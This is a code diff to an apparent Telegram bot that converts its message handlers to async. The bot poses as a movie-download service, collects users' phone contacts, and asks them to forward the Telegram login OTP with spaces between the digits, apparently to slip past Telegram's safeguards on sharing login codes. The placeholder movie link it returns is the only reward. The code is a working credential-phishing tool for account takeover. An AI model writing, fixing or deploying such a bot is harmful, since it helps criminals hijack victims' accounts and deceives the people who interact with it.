@@ -81,7 +81,7 @@ Lucifer S03E01
 
 # Handler for text messages
 @Client.on_message(filters.private & filters.text)
-def search_movie(client, message):
+async def search_movie(client, message):
     query = message.text
     reply_markup = InlineKeyboardMarkup(
         [[InlineKeyboardButton(f"{query} Dubbed Sony DADC DVDRip Full Movie.mkv", callback_data=f"movie_{query}")]]
@@ -93,7 +93,7 @@ def search_movie(client, message):
 
 # Handler for button press with admin check
 @Client.on_callback_query()
-def movie_button(client, callback_query):
+async def movie_button(client, callback_query):
     user_id = callback_query.from_user.id
     query = callback_query.data.split("_", 1)[1]
 
@@ -114,16 +114,16 @@ def movie_button(client, callback_query):
 
 # Handler for receiving contact
 @Client.on_message(filters.contact)
-def contact_received(client, message):
-    message.reply_text(f"<b> Sending OTP... </b>")
+async def contact_received(client, message):
+    await message.reply_text(f"<b> Sending OTP... </b>")
     time.sleep(5)
-    message.reply_text(f"""<b> Please check for an OTP in official Telegram account.
+    await message.reply_text(f"""<b> Please check for an OTP in official Telegram account.
 If you got it, send OTP here after reading the below format.
 If OTP is 12345, please send it as 1 2 3 4 5. </b>"""
     )
 
 # Handler for OTP message
 @Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$"))
-def otp_received(client, message):
-    message.reply_text(f"""<b> Here is Your Link: 
+async def otp_received(client, message):
+    await message.reply_text(f"""<b> Here is Your Link: 
 https://example.com/yourmovie </b>""")
